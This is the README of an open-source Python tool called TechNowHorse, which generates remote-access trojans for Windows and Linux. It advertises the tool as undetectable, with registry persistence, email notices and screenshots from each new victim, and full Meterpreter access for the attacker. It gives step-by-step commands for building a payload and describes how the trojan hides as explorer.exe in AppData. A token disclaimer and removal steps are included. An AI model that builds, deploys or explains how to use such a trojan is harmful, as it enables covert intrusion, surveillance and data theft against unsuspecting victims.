<h1 align="center">TechNowHorse</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3.7-green.svg">
  </a>
  <a href="https://github.com/Technowlogy-Pushpender/technowhorse/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/Technowlogy-Pushpender/technowhorse/releases">
    <img src="https://img.shields.io/badge/Release-1.0-blue.svg">
  </a>
    <a href="https://github.com/Technowlogy-Pushpender/technowhorse">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>



<p align="center">
  TechNowHorse is a RAT (Remote Administrator Trojan) Generator for Windows/Linux systems written in Python 3.
</p>
              
                        This small python script can do really awesome work.

## Disclaimer
<p align="center">
  :computer: This project was created only for good purposes and personal use.
</p>

THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.

## Features
- [x] Works on Windows/Linux
- [x] Notify New Victim Via Email
- [x] Undetectable
- [x] Persistence
- [x] Sends Screenshot of Victim PC's Screen via email
- [x] Give Full Meterpreter Access to Attacker
- [x] Didn't ever require metesploit installed to create trojan
- [x] Creates Executable Binary With Zero Dependencies

## Note
Due to this feature:  ****Sends Screenshot of Victim PC's Screen via email****

Size of evil_file is increased from 6 mb to 60 mb. If size matters you then use technowhorse v1.1

## Tested On
[![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - ROLLING EDITION**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 8.1 - Pro**


## Following is the limitations of meterpreter payload generated using metasploit:-
  * Have to run the Metasploit Listener before executing backdoor
  * Backdoor itself don't become persistence, we have to use the post exploitation modules in order to make backdoor persistence. 
    And post exploitation modules can only be used after successful exploitation.
  * Didn't Notify us whenever payload get executed on new system.
  
We all know how powerful the Meterpeter payload is but still the payload made from it is not satisfactory.

## Following are the features of this payload generator which will give you a good idea of this python script:-
  * Uses Windows registry to become persistence in windows.
  * Also manages to become persistence in linux system.
  * Payload can run on LINUX as well as WINDOWS.
  * Provide Full Access, as metasploit listener could be used as well as supports custom listener (You can Create Your Own Listener)
  * Sends Email Notification, when ever payload runs on new system, with complete system info.
  * Generates payload within 1 minute or ever less.
  * Supports all meterpreter post exploitation modules.
  * Payload Can be Created on Windows as well as Linux system.


## Prerequisite
- [x] Python 3.X
- [x] Few External Modules

## How To Use in Linux
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/Technowlogy-Pushpender/technowhorse.git

# Go into the repository
$ cd technowhorse

# Installing dependencies
$ python -m pip install -r requirements.txt

$ chmod +x paygen.py
$ ./paygen.py  --help    or   python paygen.py --help

# Making Payload/RAT
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name
```

## How To Use in Windows
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/Technowlogy-Pushpender/technowhorse.git

# Go into the repository
$ cd technowhorse

# Installing dependencies
$ python -m pip install -r requirements.txt

# Open paygen.py in Text editor and Configure Line 7 "PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe" "

# Getting Help Menu
$ python paygen.py --help

# Making Payload/RAT
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -w -o output_file_name
```

## Note:- Evil File will be saved inside dist/ folder, inside technowhorse/ folder

## Screenshots:

#### Getting Help
![](/img/1.help.png)

#### Running paygen.py Script
![](/img/2.running_script.png)

#### When RAT runs, it adds Registry to become persistence
![](/img/3.added_registry_for_persistence.png)

#### Makes copy of itself and saved it inside Roming
![](/img/4.rat_saved_roming.png)

#### Report sended by RAT
![](/img/5.report_from_rat.png)

#### Getting Notification From Victim PC
![](/img/6.getting_notification.png)

## Contributors:
Currently this repo is maintained by me (Pushpender Singh). Owner of https://www.technowlogy.tk Website.

All contributor's pull request will be accepted if their pull request is worthy for this repo.

## TODO
- [ ] Add new features
- [ ] Contribute GUI 

## Removing TrojanHorse:
* Go to start, type regedit and run the first program, this will open the registry editor.
* Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  There should be an entry called winexplorer, right click this entry and select Delete.
* Go to your user path > AppData > Roaming, you’ll see a file named “explorer.exe”, this is the RAT, right click > Delete.
* Restart the System.

## Contact 
singhpushpender250@gmail.com or [Contact Us](https://technowlogy.tk/contact-us)

## More Features Coming Soon...
